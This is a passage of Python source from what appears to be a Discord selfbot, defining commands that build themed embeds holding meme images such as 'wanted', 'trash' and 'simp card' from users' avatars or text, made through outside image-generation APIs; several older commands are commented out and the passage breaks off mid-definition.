            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass
        
    @React.command(usage="tobecontinued <Member>", description="Generates a tobecontinued image with the member's profile picture")
    async def tobecontinued(ctx, user: discord.User):
        try:
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'To Be Continued',timestamp=embed_timestamp())
            request = requests.get(f'https://reactselfbot.pro/api/generation.php?type=tobecontinued&url={str(user.avatar_url).replace(".webp", ".png")}').json()['url']
            embed.set_image(url=f'{request}')
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass
        
    @React.command(usage="subzero <Member>", description="Generates a subzero image with the member's profile picture")
    async def subzero(ctx, user: discord.User):
        try:
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Subzero',timestamp=embed_timestamp())
            request = requests.get(f'https://reactselfbot.pro/api/generation.php?type=subzero&url={str(user.avatar_url).replace(".webp", ".png")}').json()['url']
            embed.set_image(url=f'{request}')
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass
        
    @React.command(usage="vs <Member>", description="Generates a vs image with the member's profile picture")
    async def vs(ctx, user: discord.User):
        try:
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'VS',timestamp=embed_timestamp())
            request = requests.get(f'https://reactselfbot.pro/api/generation.php?type=vs&url={str(user.avatar_url).replace(".webp", ".png")}&avatar={str(ctx.author.avatar_url).replace(".webp", ".png")}').json()['url']
            embed.set_image(url=f'{request}')
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass
        
    @React.command(usage="wanted <Member>", description="Generates a wanted image with the member's profile picture")
    async def wanted(ctx, user: discord.User):
        try:
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Wanted',timestamp=embed_timestamp())
            request = requests.get(f'https://reactselfbot.pro/api/generation.php?type=wanted&url={str(user.avatar_url).replace(".webp", ".png")}').json()['url']
            embed.set_image(url=f'{request}')
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass
        
    @React.command(usage="whowouldwin <Member>", description="Generates a whowouldwin image with the member's profile picture")
    async def whowouldwin(ctx, user: discord.User):
        try:
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Who Would Win',timestamp=embed_timestamp())
            request = requests.get(f'https://reactselfbot.pro/api/generation.php?type=whowouldwin&url={str(user.avatar_url).replace(".webp", ".png")}&avatar={str(ctx.author.avatar_url).replace(".webp", ".png")}').json()['url']
            embed.set_image(url=f'{request}')
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass
        
    # @React.command()
    # async def theflooris(ctx, *, text: str):
    #     embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'The floor is',timestamp=embed_timestamp())
    #     embed.set_image(url=f'https://api.alexflipnote.dev/floor?image={ctx.author.avatar_url}&text={urllib.parse.quote(text)}')
    #     embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
    #     embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
    #     await embed_or_codeblock(ctx, embed)


        
    # @React.command()
    # async def jokeoverhead(ctx, *, user: discord.User):
    #     embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Joke over head',timestamp=embed_timestamp())
    #     embed.set_image(url=f'https://api.alexflipnote.dev/jokeoverhead?image={user.avatar_url}')
    #     embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
    #     embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
    #     await embed_or_codeblock(ctx, embed)



    # @React.command()
    # async def challenge(ctx, *, text):
    #     embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Challenge Complete',timestamp=embed_timestamp())
    #     embed.set_image(url=f"https://api.alexflipnote.dev/challenge?text={urllib.parse.quote(text)}")
    #     embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
    #     embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
    #     await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="scroll <Text>", description="Generates a Scroll of Truth image")
    async def scroll(ctx, *, text: str):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Scroll of Truth',timestamp=embed_timestamp())
        request = requests.get(f'https://reactselfbot.pro/api/generation.php?type=scroll&text={str(urllib.parse.quote(text))}').json()['url']
        embed.set_image(url=f'{request}')
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="captcha <Text>", description="Generates a reCAPTCHA image")
    async def captcha(ctx, *, text: str):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'reCAPTCHA',timestamp=embed_timestamp())
        request = requests.get(f'https://reactselfbot.pro/api/generation.php?type=captcha&text={str(urllib.parse.quote(text))}').json()['url']
        embed.set_image(url=f'{request}')
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="facts <Text>", description="Generates a facts image")
    async def facts(ctx, *, text: str):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Facts',timestamp=embed_timestamp())
        request = requests.get(f'https://reactselfbot.pro/api/generation.php?type=facts&text={str(urllib.parse.quote(text))}').json()['url']
        embed.set_image(url=f'{request}')
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    # @React.command()
    # async def calling(ctx, *, text: str):
    #     embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Calling',timestamp=embed_timestamp())
    #     embed.set_image(url=f'https://api.alexflipnote.dev/calling?text={urllib.parse.quote(text)}')
    #     embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
    #     embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
    #     await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="phlogo <Text 1> <Text 2>", description="Generates a Pornhub Logo image")
    async def phlogo(ctx, text1: str, text2: str):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'PornHub Logo',timestamp=embed_timestamp())
        request = requests.get(f'https://reactselfbot.pro/api/generation.php?type=phlogo&text={str(urllib.parse.quote(text1))}&text2={str(urllib.parse.quote(text2))}').json()['url']
        embed.set_image(url=f'{request}')
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="deletetrash <User>", description="Generates a delete trash image")
    async def deletetrash(ctx, user: discord.User):
        try:
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Delete Trash',timestamp=embed_timestamp())
            embed.set_image(url=f'https://api.no-api-key.com/api/v2/delete?image={str(user.avatar_url).replace(".webp", ".png")}')
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass
        
    @React.command(usage="smart <User>", description="Generates a smart image")
    async def smart(ctx, user: discord.User):
        try:
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Smart',timestamp=embed_timestamp())
            embed.set_image(url=f'https://api.no-api-key.com/api/v2/smrt?image={str(user.avatar_url).replace(".webp", ".png")}')
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass
        
    @React.command(usage="shoot <User>", description="Generates a shoot image")
    async def shoot(ctx, user: discord.User):
        try:
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Shoot',timestamp=embed_timestamp())
            embed.set_image(url=f'https://api.no-api-key.com/api/v2/shoot?image={str(user.avatar_url).replace(".webp", ".png")}')
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass

    @React.command(usage="belikebill", description="Sends a Be Like Bill image")
    async def belikebill(ctx):
        try:
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Be Like Bill',timestamp=embed_timestamp())
            embed.set_image(url=f'https://belikebill.ga/billgen-API.php?default=1')
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass
        
    @React.command(usage="trash <User>", description="Generates a trash image")
    async def trash(ctx, user: discord.User):
        try:
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Trash',timestamp=embed_timestamp())
            embed.set_image(url=f'https://api.no-api-key.com/api/v2/trash?image={str(user.avatar_url).replace(".webp", ".png")}')
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass

    @React.command(usage="crap <User>", description="Generates a crap image")
    async def crap(ctx, user: discord.User):
        try:
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Crap',timestamp=embed_timestamp())
            embed.set_image(url=f'https://api.no-api-key.com/api/v2/crap?stepped={str(user.avatar_url).replace(".webp", ".png")}')
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass

    @React.command(usage="simpcard <User>", description="Generates a simpcard image")
    async def simpcard(ctx, user: discord.User):
        try:
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Simp Card',timestamp=embed_timestamp())
            embed.set_image(url=f'https://api.no-api-key.com/api/v2/simpcard?image={str(user.avatar_url).replace(".webp", ".png")}')
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass

    @React.command(usage="punch <User>", description="Generates a punch image")
    async def punch(ctx, user: discord.User):
        try:
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Punch',timestamp=embed_timestamp())
            embed.set_image(url=f'https://api.no-api-key.com/api/v2/punch?punch={str(React.user.avatar_url).replace(".webp", ".png")}&punched={str(user.avatar_url).replace(".webp", ".png")}')
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass
        
    @React.command(usage="snow <User>", description="Snow meme")
    async def snow(ctx, user: discord.User):
        try:
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Snow',timestamp=embed_timestamp())
            embed.set_image(url=f'https://api.no-api-key.com/api/v2/snow?image={str(user.avatar_url).replace(".webp", ".png")}')
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass
        
    # @React.command()
    # async def didyoumean(ctx, text1: str, *, text2: str):
    #     embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Did you mean',timestamp=embed_timestamp())
    #     embed.set_image(url=f'https://api.alexflipnote.dev/didyoumean?top={urllib.parse.quote(text1)}&bottom={urllib.parse.quote(text2)}')
